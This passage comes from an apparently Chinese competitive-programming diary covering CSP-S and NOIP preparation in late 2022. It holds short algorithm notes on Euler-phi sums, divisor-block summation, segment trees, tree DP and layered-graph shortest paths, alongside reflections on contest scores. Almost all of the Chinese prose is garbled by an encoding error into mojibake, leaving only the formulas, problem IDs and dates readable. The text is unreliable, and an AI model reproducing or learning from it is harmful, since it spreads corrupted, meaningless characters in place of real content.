$\\varphi{(\\frac{n}{d})}$ã€‚æ‰€ä»¥æœ€åçš„ç­”æ¡ˆä¸º $\\sum_{d = 1}^{n} d \\times \\varphi{(\\frac{n}{d})}$ã€‚ç”±äº $n \\in [1,10^9]$ï¼Œæ‰€ä»¥è®¡ç®— $\\varphi$ æ—¶ç”¨ $O(\\sqrt n)$ çš„å¤æ‚åº¦è®¡ç®—å³å¯ï¼Œå³ $\\varphi(n) = n(1 - \\frac{1}{p_1})(1 - \\frac{1}{p_2})\\cdots(1 - \\frac{1}{p_n})$ çš„è¡¨è¾¾å¼ã€‚ Minimum Modular ç”±ä½™æ•°çš„å®šä¹‰å¯çŸ¥ï¼Œè‹¥ æ‰€æœ‰å‰©ä¸‹çš„æ•° $\\mod M$ å‡ä¸åŒï¼Œæ˜¾ç„¶æœ€å°çš„ $M \\in [n - k,\\max \\{a_i\\}]$ï¼Œç”±æ•°æ®èŒƒå›´å¯çŸ¥æˆ‘ä»¬å¯ä»¥æšä¸¾ $M$ã€‚å‘ç°å½“ $a_i$ ä¸ $a_j$ åŒä½™æ—¶ï¼Œ$|a_i - a_j| \\mid M$ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é¢„å¤„ç†å·®å€¼ï¼Œç„¶åå°† $M,2M,\\cdots,kM$ çš„æ•°å…¨éƒ¨è¿›è¡Œç»Ÿè®¡ï¼Œè‹¥åœ¨é¢˜ç›®å…è®¸çš„ä¿®æ”¹èŒƒå›´å†…ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ‰¾åˆ°äº†æœ€å°çš„ $M$ï¼Œè¾“å‡ºå³å¯ã€‚ å·²çŸ¥è‹¥ $x,y \\in S$ï¼Œåˆ™ $\\gcd (x,y) \\in S$ã€‚ç°åœ¨ç»™å‡ºé›†åˆä¸­ä¸€å®šå­˜åœ¨çš„è‹¥å¹²ä¸ªæ•°ï¼Œéœ€è¦æ±‚å‡ºé›†åˆçš„æœ€å°å¤§å°ã€‚ é›†åˆçš„æœ€å¤§æ•°ä¸€å®šæ˜¯æ‰€ç»™ä¸­çš„æœ€å¤§å€¼ï¼Œäºæ˜¯æˆ‘ä»¬åˆå¯ä»¥æšä¸¾æ¯ä¸€ä¸ªæ•°ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨ã€‚å¯¹äºä¸€ä¸ªè¾“å…¥ä¸­ä¸åŒ…æ‹¬çš„æ•° $x$ï¼Œå°†æ‰€æœ‰å·²ç»å­˜åœ¨äºé›†åˆçš„ $kx$ çš„ $k$ è¿›è¡Œ $\\gcd$ è¿ç®—ï¼Œè‹¥æœ€åçš„ç»“æœä¸º $1$ï¼Œåˆ™è¯´æ˜æœ€åèƒ½å¤Ÿå¾—åˆ° $x$ï¼Œå°†å…¶æ ‡è®°ååŠ å…¥ç­”æ¡ˆå³å¯ã€‚æ—¶é—´å¤æ‚åº¦ä¸ºè°ƒå’Œçº§æ•°ä»¥åŠå¤–å±‚çš„æšä¸¾ï¼Œä¸º $O(n \\log n)$ã€‚ æ±‚ $\\sum_{i = 1}^{n} n \\% i$ çš„å€¼ã€‚ åŸå¼å¯ä»¥å˜ä¸º $\\sum_{i = 1}^{n} n - \\lfloor \\dfrac{n}{i} \\rfloor \\times i = n^2 - \\sum_{i = 1}^{n} \\lfloor \\dfrac{n}{i} \\rfloor \\times i$ã€‚åè€…æ˜¾ç„¶ç”¨æ•´é™¤åˆ†å—åŠ ä¸Šç­‰å·®æ•°åˆ—æ±‚å’Œç»´æŠ¤å³å¯ï¼Œéœ€è¦æ³¨æ„å–æ¨¡ä»¥åŠæ•°æ®èŒƒå›´ï¼ˆ$n$ å…ˆå–æ¨¡åè¿ç®—ï¼Œå¦åˆ™ä¼šçˆ†ï¼‰ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(\\sqrt n)$ã€‚ $\\texttt{2022.10.28}$ã€æ’æ’­å¹¿å‘Šã€‘ ä»Šå¤©æ˜¯å·¨ä½¬ $\\texttt{CENRUIYANG}$ çš„ç”Ÿæ—¥ï¼Œè®©æˆ‘ä»¬ä¸€èµ·ç¥ä»–ç”Ÿæ—¥å¿«ä¹ã€‚æŠŠè¿™æ¡æ¶ˆæ¯è½¬å‘åˆ°äº”ä¸ªç¾¤ï¼Œå°±èƒ½å‘ä»–ä¸€æ ·çˆ†åˆ‡ $\\texttt{IOI}$ äº†ï¼ˆç‹—å¤´ã€‚ é‡æ¸©ä¸€ä¸‹æœ€çŸ­è·¯ã€‚ æ‹†ç‚¹æ˜¯ä¸ªå¾ˆå¥½çš„åšæ³•ï¼Œç›¸å½“äºæ˜¯å°†ä¸€ä¸ªç‚¹æ‹†æˆä¸åŒçŠ¶æ€çš„å¤šä¸ªç‚¹ï¼Œç„¶ååˆ†åˆ«è¿è¾¹è¿›è¡Œå»ºå›¾ã€‚ ã€ä¾‹ã€‘ æ±‚å°†ä»»æ„ä»…ä¸€æ¡è¾¹çš„è¾¹æƒé™¤ä»¥äºŒåçš„ $S$ åˆ° $T$ çš„æœ€çŸ­è·¯ï¼ˆä¿è¯è¾¹æƒå…¨éƒ¨ä¸ºå¶æ•°ï¼‰ã€‚ æ¯ä¸€æ¡è¾¹éƒ½ä¸ºé™¤æˆ–ä¸é™¤ä¸¤ç§çŠ¶æ€ï¼Œå› æ­¤å¯ä»¥ç”¨ $[1,n]$ è¡¨ç¤ºæœªé™¤è¿‡çš„ç‚¹ï¼Œ$[n+1,2n]$ è¡¨ç¤ºé™¤è¿‡çš„ã€‚è¿è¾¹æ—¶åªæœ‰ $(x,y+n),(y,x+n)$ æ—¶å°†è¾¹æƒé™¤ä»¥ $2$ï¼Œå¦å¤–çš„ $(x,y),(y,x),(x + n,y + n),(y + n,x + n)$ è¾¹æƒä¸å˜ã€‚æœ€åè·‘ä¸€æ¬¡ä¸ºåŸå›¾å¤§å° $3$ å€çš„æœ€çŸ­è·¯ï¼Œç„¶åè¾“å‡º $dis_{t + n}$ å³å¯ã€‚ èµ›å‰å†æ¬¡çœ‹ä¸‹æ¨¡æ‹Ÿé€€ç«ï¼Œä¸ºäº†éª—åˆ†ã€‚ æ˜å¤© $\\texttt{rp++}$ å§ï¼ $\\texttt{2022.10.29}$$\\texttt{CSP-S rp++!}$ å¼€è€ƒï¼Œ$\\texttt{T1}$ å¤šæ¬¡è¯»é”™é¢˜ç›®ï¼Œå¥½ä¸å®¹æ˜“å†™å®Œåæµ‹äº†å¤§æ ·ä¾‹çªç„¶å‘ç°å†™å‡äº†ï¼Œè¿™æ—¶å€™ç¦»å¼€è€ƒå·²ç»è¿‡å»äº† $1.5h$ï¼Œç›´æ¥å°±æ…Œäº†ã€‚ æ¥ä¸‹æ¥å…ˆå†™äº† $\\texttt{T2}$ï¼Œæ»¡åˆ†ä¼¼ä¹æœ‰äº›ç»†èŠ‚ï¼Œäºæ˜¯æœæ–­å»æ‹¿ $85\\texttt{pts}$ã€‚å†™å®Œä»¥åï¼Œæ„Ÿè§‰æ—¶é—´ä¸å¤§å¤Ÿäº†ï¼Œä¾¿å»å†™äº† $\\texttt{T1,T3}$ çš„éƒ¨åˆ†åˆ†ï¼Œ$\\texttt{T4}$ æ²¡æ¥å¾—åŠå†™ã€‚ æ„Ÿè§‰å‘æŒ¥ä¸å¤§å¥½ï¼Œä½†æ˜¯å´å‘ç°æˆ‘åªè¦ä¸€æ…Œä¹±å°±ä¸èƒ½å†ä»”ç»†å»åˆ†æé¢˜ç›®äº†ï¼Œæ‰€ä»¥åœ¨ $\\texttt{NOIP}$ ä¹‹æ—¶ä¸€å®šè¦æ›´åŠ å†·é™ä¸€ç‚¹ã€‚ ä¼°åˆ†ï¼š $(55-60)+85+(15-40)+0=155-185$ï¼Œæ„Ÿè§‰ä¸æ˜¯å¡çº¿å°±æ˜¯è¢«çº¿å¡ã€‚ $\\texttt{2022.10.31}$è¡¥é¢˜ã€‚$\\texttt{T2}$ å†™äº†å…«æ£µçº¿æ®µæ ‘ï¼Œç„¶ååˆ†ç±»ä¹ç±»è¿‡äº†ã€‚ $\\texttt{T1}$ å€Ÿé‰´äº†ä¸€ä¸‹åˆ«äººçš„æ€è·¯ï¼Œå‘ç°åªè¦æšä¸¾ $b,c$ æˆ–è€… $a,d$ï¼Œå…¶å®ƒå°±å¯ä»¥è´ªå¿ƒé¢„å¤„ç†ï¼Œå†™äº†ä¸€ä¸ª $\\texttt{bfs}$ è¿‡äº†ã€‚ï¼ˆä¸ºä»€ä¹ˆæ¯”èµ›çš„æ—¶å€™å°±å¤§è„‘ç©ºç™½å•Šå•Šå•Šâ€¦â€¦ï¼‰ $\\texttt{T3}$ ç›´æ¥åˆ¤æ–­æ¯ä¸ªç‚¹çš„å‡ºåº¦æ˜¯å¦ä¸º $1$ ä¸å°±è¡Œäº†å—ï¼Ÿå½“æ—¶æ€ä¹ˆæ²¡æœ‰æƒ³åˆ°ã€‚ç„¶ååˆ©ç”¨ hash æ¥é‡ç½®æ¯ä¸ªç‚¹çš„æƒå€¼ï¼Œå½“æ‰€æœ‰å¯ä»¥ç”¨çš„ç‚¹çš„æƒå€¼å’Œå’Œ $\\sum _{i = 1}^{n}w_i$ ç›¸åŒæ—¶å°±å¯ä»¥åˆ¤æ–­åˆæ³•äº†ï¼Œè¿™æ ·å¤æ‚åº¦å°±é™åˆ°äº† $O(q)$ã€‚ $\\texttt{2022.11.2}$å†™ç‚¹æ•°æ®ç»“æ„é¢˜ã€‚ å†™ç‚¹æ„é€ é¢˜ã€‚ $\\texttt{2022.11.3}$ GSS2 - Can you answer these queries II æ±‚åŒºé—´æœ€å¤§å­æ®µå’Œï¼ˆå¯ä¸ºç©ºï¼‰ï¼Œä½†æ˜¯é‡å¤æ•°å­—åªç®—ä¸€æ¬¡ã€‚ä¸éš¾æƒ³åˆ°ç¦»çº¿å¤„ç†ï¼ŒæŒ‰è¯¢é—®çš„å³ç«¯ç‚¹è¿›è¡Œæ’åºã€‚è®¾å½“å‰çš„ç‚¹ä¸º $i$ï¼Œåˆ™è¯¥æ•°æ‰€äº§ç”Ÿçš„å½±å“çš„åŒºé—´ä¸º $[pre_i + 1,i]$ï¼Œå› æ­¤åœ¨æ›´æ–°åæ±‚å‡ºå†å²åŒºé—´å’Œçš„æœ€å€¼ï¼ˆä»¥ä¹‹å‰çš„ä¸€ç‚¹æœ€å¤šåˆ° $i$ ç‚¹çš„æœ€å€¼ï¼‰ã€‚ P6018 [Ynoi2010] Fusion tree $\\texttt{01 Tire}$ çš„è¿ç”¨ã€‚å¯¹äºæ¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¼€ä¸€ä¸ªå­—å…¸æ ‘ã€‚å¯¹äºæ“ä½œä¸‰ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡å­—å…¸æ ‘æ±‚å‡ºå­ç»“ç‚¹çš„å¼‚æˆ–å’Œï¼Œç”±äºåªæœ‰ä¸€ä¸ªçˆ¶äº²ï¼Œç›´æ¥å•ç‹¬å¤„ç†å³å¯ã€‚å¯¹äºæ“ä½œäºŒï¼Œå…ˆåˆ é™¤å†æ’å…¥èŠ‚ç‚¹ï¼ŒåŒæ ·çš„ï¼Œå¯¹çˆ¶äº²å•ç‹¬è¿›è¡Œå¤„ç†ï¼Œå—åˆ°å½±å“çš„æ˜¯çˆ¶äº²çš„çˆ¶äº²èŠ‚ç‚¹ã€‚å¯¹äºæ“ä½œä¸€ï¼Œéœ€è¦é€šè¿‡æ¨¡æ‹Ÿå¯çŸ¥ï¼ŒåŠ ä¸€ç›¸å½“äºåœ¨ $\\texttt{01 Trie}$ ä¸­äº¤æ¢å·¦å³èŠ‚ç‚¹ï¼Œå› æ­¤ç›´æ¥é€’å½’æ±‚è§£å³å¯ã€‚ P1318 ç§¯æ°´é¢ç§¯ å•è°ƒæ ˆï¼Œå½“ä¸”ä»…å½“å·¦å³åŒºåŸŸå‡æ¯”å…¶å¤§æ—¶ä¼šäº§ç”Ÿç§¯æ°´ã€‚å¯ä»¥ç›´æ¥æ­£åºå€’åºå¤„ç†å‡ºä¸¤ä¸ªæ•°ç»„è¡¨ç¤ºä»å·¦/å³å¼€å§‹çš„æœ€å¤§é«˜åº¦ï¼Œç„¶åéå†åˆ¤æ–­ $a_i$ ä¸æœ€å¤§é«˜åº¦çš„æœ€å°å€¼çš„ç›¸å¯¹å¤§å°å³å¯ã€‚ P4053 [JSOI2007] å»ºç­‘æŠ¢ä¿® æŒ‰æ—¶é—´æ’åºåèƒ½åŠ å°±åŠ ï¼Œä¸èƒ½åŠ æ—¶è‹¥èƒ½å¤Ÿæ›¿æ¢åŸæœ‰ç­”æ¡ˆä½¿å¾—æ›´ä¼˜ï¼ˆä¹Ÿå°±æ˜¯è¯´å½“å‰ä¿®å¤æ—¶é—´æ¯”åŸæœ‰ç­”æ¡ˆçš„æœ€å¤§å€¼å°æ—¶ï¼‰ï¼Œåˆ™å°†å…¶æ›¿æ¢ã€‚å¯ä»¥ä½¿ç”¨ä¼˜å…ˆé˜Ÿåˆ—æˆ– multiset å®ç°ã€‚ $\\texttt{2022.11.6}$å‘¨æœ«æŒ‰é“ç†æ˜¯å»æ•™å®¤è‡ªä¹ ï¼Œä½†æ˜¯è¿˜æ˜¯æ¥åˆ°æœºæˆ¿ï¼Œè¿˜ç¿˜äº†æ•°å­¦è€ƒè¯•ã€‚ ä¸Šåˆçåšäº†ç‚¹é¢˜ç›®ï¼Œä¸­åˆæ‰“é¥­çš„å¤§ä¼¯ç»™äº†ä¸¤å—è‚‰è¿˜è¯´è¿™å·²ç»å¾ˆå¤šäº†ï¼Ÿï¼Ÿï¼Ÿï¼ˆçœŸçš„æ°”æ­»ï¼‰ ä¸‹åˆæ¨¡æ‹Ÿèµ›ã€‚ï¼ˆåœ¨æœºæˆ¿æ‰“é¢˜çœŸçš„ä¼šé™æ™ºå˜›ï¼Œæ€ä¹ˆæ‰“å¼±æ™ºé”™è¯¯ï¼Ÿï¼‰ $\\texttt{T1}$ ç®€å•è´ªå¿ƒï¼Œå†™å®Œç›´æ¥äº¤ã€‚åš $\\texttt{T2}$ çš„æ—¶å€™çªç„¶æ„è¯†åˆ° $\\texttt{T1}$ çš„æ’åºå‡ºé”…äº†ï¼Œäºæ˜¯èµ¶ç´§æ”¹ã€‚ $\\texttt{T2}$ ç®€å•æ•°å­¦é¢˜ï¼Œå‘ç°è¦æ±‚ $n \\times m + (n - 1) \\times (m - 1) + (n - 2) \\times (m - 2) + \\cdots + (n - m + 1) \\times (m - (m - 1))$ã€‚ç›´æ¥æ‹†æ‹¬å·ï¼ŒåŒ–ç®€æˆ $nm^2 - \\dfrac{m(n + m)(m - 1)}{2} + \\dfrac{m(m - 1)(2m - 1)}{6}$ã€‚ç„¶åå‘ç°è¦é«˜ç²¾ï¼Œå°è¯• pythonï¼Œçªç„¶æ„è¯†åˆ°è¦è¶…æ—¶ï¼Œç„¶ååˆçµæœºä¸€åŠ¨å†™äº†ä¸ª __int128ï¼Œç›´æ¥æ°´è¿‡ã€‚ ç„¶åè·³è¿‡äº† $\\texttt{T3}$ å†™ $\\texttt{T4}$ï¼Œé™æ™ºå¼€å§‹äº†ï¼æƒ³äº†å¾ˆä¹…å°±æ˜¯æƒ³ä¸å‡ºæ­£è§£ï¼Œäºæ˜¯æ‰“ç®—éª— $\\texttt{69 pts}$ï¼Œç„¶è€Œç¬¬äºŒå±‚ $\\texttt{dp}$ å†™æˆäº† for (int j = 1;j n;++j)ï¼Œè€Œåº”è¯¥æ˜¯ for (int j = 1;j i;++j)ã€‚èµ›æ—¶è¿ç€å¯¹æ‹ä¸€èµ·å†™æŒ‚äº†ï¼Œæ‰€ä»¥æ²¡æŸ¥å‡ºæ¥ï¼Œ$\\texttt{69 pts} \\to \\texttt{21 pts}$ã€‚ æœ€åå†™ $\\texttt{T3}$ å‘ç°æ˜¯ä¸ªè¿›åˆ¶è½¬æ¢ï¼Œç„¶åæ— è„‘æ¨¡æ‹Ÿã€‚è¿‡äº†æ ·ä¾‹ï¼Œæäº¤åå°±å¼€æ‘†äº†ã€‚èµ›åå‘ç°çˆ†çµï¼Œç„¶åå‘ç°è‡ªå·±è¡Œæœ«çš„ ; ç«Ÿç„¶æ‰“æˆäº† ,ï¼Œä¹Ÿå°±æ˜¯è¯´æ¡ä»¶è¯­å¥ä¸æ‰§è¡Œï¼Œç­”æ¡ˆä¹Ÿä¸ä¼šè¢«æ›´æ–°ï¼Œç›´æ¥æ™•å€’ã€‚æ›´åŠ ç¥å¥‡çš„æ˜¯ï¼Œ$256$ è¿›åˆ¶æˆ‘ä¹˜çš„æƒå€¼ç«Ÿç„¶æ˜¯ $255$ï¼Œå†æ¬¡æ™•å€’ã€‚éšä¾¿æ”¹äº†ä¸¤ä¸‹å°±è¿‡äº†ã€‚ äºæ˜¯ï¼Œç”±äºæˆ‘çš„é™æ™ºï¼Œ$100 + 100 + 100 + 69 = 369 \\to 100 + 100 + 0 + 21 = 221$ï¼ŒçœŸçš„æ˜¯â€¦â€¦æ— è¯­ä½äº†ã€‚ ç»§ç»­å†™ $\\texttt{T4}$ï¼Œå°è¯•ä¼˜åŒ– $\\texttt{DP}$ï¼Œè€ƒè™‘ç”¨ä¼˜å…ˆé˜Ÿåˆ—ï¼Œæ—¶é—´å¤æ‚åº¦ $O(nm \\log n)$ï¼ŒåŠ ä¸€ä¸ªç‰¹åˆ¤å°±å¯ä»¥æ‹¿åˆ° $\\texttt{88 pts}$ çš„å¥½æˆç»©ã€‚å‘ç°æ¯å±‚æ‰« $m$ æ¬¡å®åœ¨æœ‰ç‚¹æµªè´¹æ—¶é—´ï¼Œç”±äºè¦æ‰¾åˆ°æœ€å€¼ï¼Œäºæ˜¯å°†æ˜¯å¦ç±»å‹ä¸€æ ·åˆ†åˆ«è€ƒè™‘ç„¶åå»æœ€å¤§å€¼ï¼Œç”¨çº¿æ®µæ ‘æ¥ä¼˜åŒ– $\\texttt{DP}$ï¼Œå‘ç°å¯åšã€‚å†™äº†ä¸€å‘å°±è¿‡å˜ï¼Œå¼€å¿ƒï¼ï¼ï¼æœ€åæ—¶é—´å¤æ‚åº¦ $O(n \\log m)$ã€‚ $\\texttt{2022.11.8}$å‡ºåˆ†äº†ï¼$\\texttt{CCF}$ æœç„¶æ˜¯è„šé€ æ ·ä¾‹ï¼Œä¸è¿‡åº”è¯¥è¿˜æ˜¯æ‹¿äºŒç­‰å¥–ï¼ˆå› ä¸ºæ²¡å†™ $\\texttt{T4}$)ã€‚ å®é™…åˆ†æ•°ï¼š$\\texttt{60+85+60+0=205 pts}$ã€‚ $\\texttt{2022.11.9-11.11}$å­¦æ ¡ä¸¾è¡Œè¿åŠ¨ä¼šåŠ ä¸Šè‰ºæœ¯èŠ‚ï¼Œå½“ç„¶è¦å»ç©å•¦ï¼ è€å¸ˆåœ¨ç­ä¸Šè¯´ï¼Œç«èµ›è¦å­¦ä¼šå–èˆå•¥çš„ï¼Œæ€ä¹ˆæ„Ÿè§‰åœ¨è®½åˆºæˆ‘æ $\\texttt{qwq}$ã€‚ $\\texttt{2022.11.12}$ P3957 [NOIP2017 æ™®åŠç»„] è·³æˆ¿å­ å•è°ƒé˜Ÿåˆ—ä¼˜åŒ– $\\texttt{dp}$ã€‚ Axel and Marston in Bitland dp[s][op][i][j] è¡¨ç¤ºä»¥ $op$ èµ·å§‹ï¼Œ$i \\to j$ æ˜¯å¦å­˜åœ¨è·ç¦»ä¸º $2^s$ çš„è¾¹ï¼Œç„¶åç”¨ bitset å‹ä½å¤„ç†ã€‚ P4290 [HAOI2008] ç©å…·å–å åŒºé—´ $\\texttt{dp}$ï¼Œç é‡æ¯”è¾ƒå¤§ï¼ŒåŒæ—¶éœ€è¦æ³¨æ„åˆå§‹åŒ–ã€‚ P3049 [USACO12MAR]Landscaping S æ™®é€šçº¿æ€§ $\\texttt{dp}$ï¼Œdp[i][j] è¡¨ç¤º $a$ çš„å‰ $i$ ä¸ªä¸ $b$ çš„å‰ $j$ ä¸ªç›¸åŒ¹é…çš„æœ€å°èŠ±è´¹ã€‚ Name That Tune æœŸæœ› $\\texttt{dp}$ï¼Œdp[i][j] è¡¨ç¤ºåœ¨å¬å®Œå‰ $i$ é¦–æ­ŒèŠ±è´¹ $j$ ç§’çš„æœŸæœ›ï¼Œç„¶åç”¨å‰ç¼€å’Œè¿›è¡Œä¼˜åŒ–ã€‚ æ™šä¸Šæ‰“ $\\texttt{CF}$ï¼Œå¿«é€Ÿåˆ‡ $\\texttt{AB}$ï¼Œ$\\texttt{C}$ é¢˜è´ªå¿ƒçš„æ€è·¯éå¸¸å¥½æƒ³åˆ°ï¼Œä½†æ˜¯å®ç°èµ·æ¥ç»†èŠ‚å·¨å¤šï¼Œä¸€ç›´ $\\texttt{WA}$ ä¸€ç›´è°ƒï¼Œäº¤äº† $6$ å‘æ‰è¿‡ï¼Œå¯¼è‡´æµªè´¹äº†å¤§é‡æ—¶é—´ã€‚ç”¨ä»…å‰©çš„ $30$ åˆ†é’Ÿå»å†™ $\\texttt{D}$ï¼ŒæŒ‰ä½å¤„ç†ï¼Œç„¶åè°ƒäº†ä¸€åŠå°±ç»“æŸäº†ï¼Œé™å¤§åˆ†ã€‚ $\\texttt{2022.11.13}$å­¦æ ¡æ¨¡æ‹Ÿèµ›ï¼Œåˆä¸€æ¬¡å‡‰å¿ƒã€‚ $\\texttt{T1}$ æäº†å¾ˆä¹…çš„ $\\texttt{dp}$ï¼Œä½†æ˜¯å®ç°ä¸å‡ºæ¥ï¼Œæœ€åæ”¹å†™æˆæš´åŠ›ã€‚ $\\texttt{T2}$ è´ªå¿ƒï¼Œå†™å®Œæµ‹äº†å¤§æ ·ä¾‹å‘ç°å‡äº†ï¼Œå®é™…ä¸Šæ²¡çœ‹æ¸…é¢˜ç›®ä¸­çš„ä¸€ä¸ªé™åˆ¶ï¼Œå“ä¸ç®¡äº†ï¼Œå°±å…ˆè¿™æ ·ã€‚ $\\texttt{T3}$ ç›´æ¥æ¨¡æ‹Ÿå°±å¯ä»¥æœ‰ $\\texttt{40 pts}$ï¼Œä»”ç»†ä¸€æƒ³é¢„å¤„ç†æ¯ä¸€è¡Œå¯ä»¥ç”¨å€å¢ã€‚ä¸€å¼€å§‹æƒ³è¦è®¾ç¬¬ $i$ è¡Œä» $j$ å¼€å§‹ç»è¿‡ $2^p$ çš„è·ç¦»æ‰€éœ€çš„æœ€å°èŠ±è´¹ï¼Œç”±äºè´ªå¿ƒçš„æ€æƒ³ï¼Œæ¯æ¬¡åº”è¯¥ä» X çš„æ ¼å­å¼€å§‹è®¡ç®—èŠ±è´¹ï¼Œæ‰€ä»¥è¿™æ ·è®¾å¹¶ä¸å¥½è½¬ç§»ã€‚æƒ³äº†ä¸€ä¼šå„¿ï¼Œæœæ–­æ”¾å¼ƒã€‚æ¢ä¸€ç§è®¾æ³•ï¼Œè®¾ $f_{i,j,p}$ è¡¨ç¤ºç¬¬ $i$ è¡Œä» $j$ å¼€å§‹èŠ±è´¹ $2^p$ çš„ä»£ä»·èƒ½åˆ°è¾¾çš„æœ€è¿œè·ç¦»ï¼Œæœ€è¿œç‚¹è®¾ä¸º $m + 1$ï¼Œäºæ˜¯å°±æœ‰ $f_{i,j,p} = f_{i,f_{i,j,p - 1},p - 1}$ï¼Œäºæ˜¯æ—¶é—´å¤æ‚åº¦å°±é™åˆ° $\\log$ çº§åˆ«äº†ã€‚ $\\texttt{T4}$ å®Œå…¨ä¸ä¼šï¼Œæš´åŠ›æ²¡æ—¶é—´æ‰“äº†ã€‚ $\\texttt{20 + 14 + 100 + 0 = 134 pts}$ï¼Œç¬¬äºŒé¢˜çš„å‡ç®—æ³•ç«Ÿç„¶è¿˜æœ‰åˆ†æ˜¯æˆ‘æ²¡æƒ³åˆ°çš„ã€‚ $\\texttt{2022.11.14}$éº»éº»ç”Ÿæ—¥ã€‚ $\\texttt{2022.11.15}$ç»ƒä¹ ä¸€äº›æ ‘ä¸Šé—®é¢˜ï¼ŒåŒ…æ‹¬è´ªå¿ƒï¼Œæ•°æ®ç»“æ„å’Œ $\\texttt{dp}$ã€‚ Distance to the Path æƒ³äº†å¾ˆä¹…çš„æ•°æ®ç»“æ„é¢˜ï¼Œæ„Ÿè§‰å°†é—®é¢˜æ‹†åˆ†æˆå­æ ‘å†…å¤–è¿›è¡Œè€ƒè™‘ï¼Œæ˜¯ä¸ªå¾ˆå¦™çš„åšæ³•ã€‚å†™äº†ç¯‡é¢˜è§£ã€‚ P2279 [HNOI2003]æ¶ˆé˜²å±€çš„è®¾ç«‹ $\\texttt{dp}$ å’Œè´ªå¿ƒå‡å¯åšï¼Œè´ªå¿ƒå¥½å†™ä¸€ç‚¹ï¼Œä»æ·±åº¦å¤§çš„èŠ‚ç‚¹å¼€å§‹ï¼Œåˆ†åˆ«è€ƒè™‘æ¯ä¸ªèŠ‚ç‚¹çš„å„¿å­èŠ‚ç‚¹ä¸çˆ¶èŠ‚ç‚¹ã€‚ P3942 å°†å†›ä»¤ ä¸Šä¸€é¢˜çš„åŠ å¼ºç‰ˆï¼Œå¤§è‡´ä¾ç…§ä¹‹å‰çš„æ€è·¯è¿›è¡Œè´ªå¿ƒå³å¯ã€‚ P3523 [POI2011] DYN-Dynamite å’Œå‰ä¸¤é¢˜ç›¸ä¼¼è´ªå¿ƒä¸ $\\texttt{dp}$ ç›¸ç»“åˆï¼Œä¸è¿‡ç”±è¦ä½¿æœ€å¤§å€¼æœ€å°å¯çŸ¥éœ€è¦äºŒåˆ†ã€‚ P1084 [NOIP2012 æé«˜ç»„] ç–«æƒ…æ§åˆ¶ å¥½æƒ³ä½†ä¸å¥½å†™çš„æ ‘ä¸Šè´ªå¿ƒï¼Œå¤–é¢è¿˜è¦å¥—ä¸ªäºŒåˆ†ã€‚ P4281 [AHOI2008]ç´§æ€¥é›†åˆ / èšä¼š ä¸‰ä¸ªç‚¹ä¸¤ä¸¤æ±‚ $\\texttt{LCA}$ï¼Œç„¶åå»æœ€ä¼˜å€¼ã€‚ P4092 [HEOI2016/TJOI2016]æ ‘ ç”¨æ ‘é“¾å‰–åˆ†ç»´æŠ¤æœ€å¤§å€¼ï¼Œä¸è¿‡éœ€è¦åˆ†æ¸…æ¥š $\\texttt{dfs}$ çš„ä¸‹æ ‡å’Œå®é™…çš„ä¸‹æ ‡ã€‚ä¼¼ä¹è¿˜æœ‰ä¸€ä¸ªç¦»çº¿å€’åºå¤„ç†çš„æ–¹å¼ï¼Œå¯ä»¥å°‘ä¸€ä¸ª $\\log$ã€‚ P4211 [LNOI2014]LCA ç é‡å·¨å¤§çš„æ ‘é“¾å‰–åˆ†é¢˜ã€‚ç¦»çº¿å¤„ç†æ‰€æœ‰è¯¢é—®ï¼ŒæŒ‰ç«¯ç‚¹æ’åºåï¼Œç”¨æ ‘é“¾å‰–åˆ†ä¸å·®åˆ†ç›¸ç»“åˆã€‚å¯¹äºä¸€ä¸ª $i$ï¼Œå°†é“¾ $1 \\to i$ å‡å¢åŠ ä¸€ï¼ŒæŸ¥è¯¢æ—¶è®¡ç®— $1 \\to z$ çš„å€¼å³å¯ã€‚ Book of Evil è¿˜æ˜¯å­æ ‘å†…å¤–åˆ†å¼€è€ƒè™‘çš„å¥—è·¯ï¼Œ$dp_{u,0/1}$ è¡¨ç¤ºä»¥ $u$ ä¸ºæ ¹çš„å­æ ‘å†…æ€ªç‰©ä¸ $u$ çš„æœ€å¤§/æ¬¡å¤§è·ç¦»ï¼Œ$dp_{u,2}$ è¡¨ç¤º $u$ åˆ°å­æ ‘å¤–æ€ªç‰©çš„æœ€å¤§è·ç¦»ï¼Œç„¶åä¸¤æ¬¡ $\\texttt{dfs}$ è¿›è¡Œè½¬ç§»ã€‚ Centroids ç»§ç»­æ¢æ ¹ $\\texttt{dp}$ï¼Œè®¾ $dp{u,0/1}$ è¡¨ç¤ºä»¥ $u$ ä¸ºæ ¹å­æ ‘å†…æœ€å¤§/æ¬¡å¤§çš„ä¸”ä¸è¶…è¿‡ $\\frac{n}{2}$ çš„å­æ ‘å¤§å°ï¼Œ$g_u$ è¡¨ç¤ºä»¥ $u$ ä¸ºæ ¹çš„å­æ ‘å¤–æœ€å¤§çš„ä¸”ä¸è¶…è¿‡ $\\frac{n}{2}$ çš„å­æ ‘å¤§å°ï¼Œç„¶åå’Œä¸Šä¸€é¢˜å·®ä¸å¤šæŒ‰å¥—è·¯è½¬ç§»å³å¯ã€‚ $\\texttt{2022.11.17}$ Vitaly and Advanced Useless Algorithms å¤ä¹ äº†ä¸€é“å…³äº $0-1$ èƒŒåŒ…çš„é¢˜ç›®ï¼Œç»†èŠ‚æœ‰ç‚¹å¤šè°ƒäº† $1h$ï¼Œé¡ºä¾¿æ°´äº†ä¸€ç¯‡é¢˜è§£ã€‚ P5017 [NOIP2018 æ™®åŠç»„] æ‘†æ¸¡è½¦ å†æ¬¡å†™äº†è¿™é¢˜ï¼Œåœ¨é¢˜è§£çš„æç¤ºä¸‹ç”¨æ–œç‡ä¼˜åŒ–å†™è¿‡è¿™é¢˜ç›®ã€‚ åšç‚¹å›¾è®ºç›¸å…³çš„é¢˜ï¼Œé¡ºä¾¿å¤ä¹ äº†ä¸‹ç¼©ç‚¹ã€‚ P4568 [JLOI2011] é£è¡Œè·¯çº¿ åˆ†å±‚å›¾çš„æ€æƒ³ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„æ‹†ç‚¹ã€‚ P1462 é€šå¾€å¥¥æ ¼ç‘ç›çš„é“è·¯ äºŒåˆ†åè·‘æœ€çŸ­è·¯ï¼Œæœ€å¤§è´¹ç”¨æœ€å°åŒ–å°±å¾ˆå¥—è·¯ã€‚ P2783 